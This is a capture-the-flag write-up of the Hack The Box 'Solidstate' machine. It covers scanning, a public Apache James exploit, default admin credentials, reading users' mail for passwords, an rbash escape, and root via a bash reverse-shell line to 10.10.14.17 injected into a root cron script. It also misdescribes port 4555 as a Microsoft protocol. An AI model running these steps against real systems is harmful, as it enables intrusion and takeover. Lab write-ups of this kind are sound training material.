---
title: HTB-Solidstate
draft: false
tags:
  - smtp
  - pop3
  - nntp
  - rsip
  - htb
  - linux
  - pspy
  - cron
  - rbash
  - medium
---
## Information Gathering
### Rustscan

Rustscan discovered SSH, SMTP, HTTP, POP3, NNTP, and RSIP.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/solidstate]
└─$ rustscan --addresses 10.10.10.51 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
<snip>
Host is up, received syn-ack (1.2s latency).
Scanned at 2024-03-24 10:50:54 EDT for 2s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
25/tcp   open  smtp    syn-ack
80/tcp   open  http    syn-ack
110/tcp  open  pop3    syn-ack
119/tcp  open  nntp    syn-ack
4555/tcp open  rsip    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds
```


### Nmap

Nmap discovered version for SMTP: **2.3.2**

```bash
┌──(yoon㉿kali)-[~/Documents/htb/solidstate]
└─$ sudo nmap -sVC -p 22,25,80,110,119,4555 -v -oN svc-22-25-80-110-119-4555.nmap 10.10.10.51
<snip>
Completed Service scan at 10:54, 23.64s elapsed (6 services o
Nmap scan report for 10.10.10.51 (10.10.10.51)
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.94SVN%I=7%D=3/24%Time=66003E9C%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\
SF:nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPas
SF:sword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

<snip>
Nmap done: 1 IP address (1 host up) scanned in 371.57 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (304B)
```

## Enumeration

- **25/tcp (SMTP)**: This port is used for the Simple Mail Transfer Protocol (SMTP), which is responsible for email transmission between servers. It's used for sending outgoing mail.   
    
- **110/tcp (POP3)**: This port is used for the Post Office Protocol version 3 (POP3), which is an application-layer protocol used by email clients to retrieve emails from a mail server.
    
- **119/tcp (NNTP)**: This port is used for the Network News Transfer Protocol (NNTP), which is used to distribute, query, and retrieve news articles and newsgroup postings.
    
- **4555/tcp (RSIP)**: This port is used for the Remote Speaker Identification Protocol (RSIP), which is used for managing connections between multimedia applications and devices. It's a proprietary protocol developed by Microsoft.


### HTTP - TCP 80

HTTP was hosting web page for a penetration testing company:

![](https://i.imgur.com/qkhVYRU.png)


I found a possible user and domain name:

![](https://i.imgur.com/L7GHuZl.png)


#### Directory Bruteforce

Since nothing useful was found from the website, I moved on to directory bruteforcing but result wasn't interesting:

`sudo feroxbuster -u http://10.10.10.51 -n -x html -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![](https://i.imgur.com/iLgKijU.png)



### pop3 - TCP 110

> Post Office Protocol 3, or POP3, is the most commonly used protocol for receiving email over the internet. This standard protocol, which most email servers and their clients support, is used to receive emails from a remote server and send to a local client.


**JAMES pop3d 2.3.2** seemed vulnerable to RCE

![](https://i.imgur.com/QN9P0fF.png)

Using [this exploit](https://github.com/IcmpOff/Apache-James-Server-2.3.2---Remote-Command-Execution/blob/master/Apache-James-Rce%20Exploit.py), I can create a user on the server and start a listener waiting for someone to login to the server:

![](https://i.imgur.com/LOz303E.png)


![](https://i.imgur.com/T7InDu7.png)


I hoped there's some kind of user interaction set on this server but there wasn't so I would have to sign it myself. 

### NNTP - TCP 119

There was nothing much to be done on NNTP:

![](https://i.imgur.com/YUqQ42c.png)



### RSIP - TCP 4555

Luckily, default credentials worked for RSIP: **root:root**

![](https://i.imgur.com/5Jaig8t.png)

Typing `HELP`, I can list bunch of commands:

![](https://i.imgur.com/8oDwzMP.png)

Using `listusers`, I was able to list users on system. 

I can also see a user that was added by python script from earlier:

![](https://i.imgur.com/DPG6Rb6.png)


I decided to reset all the user's password to be looked into later:

![](https://i.imgur.com/fzAij87.png)

Now using telnet on port 110, I can sign-in to different users and check their mails:

![](https://i.imgur.com/ukoUSpa.png)

User john had one mail:

![](https://i.imgur.com/f2mtpDB.png)

Using `RETR`, I was able to view the mail and it was saying that temporary password is being send to user **mindy**:

![](https://i.imgur.com/2EzpZWv.png)

After reading the above, I signed-in as mindy:

![](https://i.imgur.com/KXKaRf5.png)

Mindy had two mails and first one indicated that she's a new member to the company:


![](https://i.imgur.com/avvKGrC.png)

Second mail was sending plain text to mindy on mail: **P@55W0rd1!2@**

![](https://i.imgur.com/lQOwS92.png)


## SSH as mindy

Using the credentials found above, I tried signing-in as **mindy**.

Because of the previous set python script and listener, SSH connection is redirected to my local listener:

![](https://i.imgur.com/WytjqDw.png)


Now on my local listener, I have a shell as **mindy**:

![](https://i.imgur.com/RWdDQNA.png)

At first, I thought I don't need this shell since I already have valid creds for SSH.

However, it turned out I have a **rbash** restriction:


![](https://i.imgur.com/hS4cZyq.png)


Using `-t bash`, I can easily escape the restricted environment:

`ssh mindy@10.10.10.51 -t bash`

![](https://i.imgur.com/a0vmVXd.png)


I believe intended way of solving this box was to use the exploit from earlier to escape rbash environment, but I can also escape it using simple `-t bash` flag. 

## Privesc: mindy to root

Checking on `/opt`, I see **tmp.py** file which I usually don't see:

![](https://i.imgur.com/D7Ues4M.png)

Script seemed to be deleting all the files in **/tmp** directory:

![](https://i.imgur.com/L6gnGG4.png)


To check if there are any automated tasks related to this script, I uploaded **pspy32** using wget and Python http server.

I ran pspy after giving it execute permission:

![](https://i.imgur.com/OEjiFQb.png)


I was able to see that the script is being ran by root here: 

![](https://i.imgur.com/n5X34Bn.png)

I added extra line of code that will spawn a reverse shell for me:

`os.system('bash -c "bash -i >& /dev/tcp/10.10.14.17/1337 0>&1"')`

![](https://i.imgur.com/JCZfyj2.png)

Now waiting for a bit, I have reverse shell connection on my local listener as root:

![](https://i.imgur.com/2a69466.png)


To make access to root connection more easier, I created SSH key on root directory following [my note on Linux Persistence](https://jadu101.github.io/Persistence%F0%9F%A5%B7%F0%9F%8F%BB/Linux-Persistence)



![](https://i.imgur.com/F07Gtwy.png)


## References
- https://github.com/IcmpOff/Apache-James-Server-2.3.2---Remote-Command-Execution/blob/master/Apache-James-Rce%20Exploit.py
- https://medium.com/@minimalist.ascent/exploring-pop3-servers-4c98e76a71ad
- https://0xffsec.com/handbook/services/nntp/
- https://jadu101.github.io/Persistence%F0%9F%A5%B7%F0%9F%8F%BB/Linux-Persistence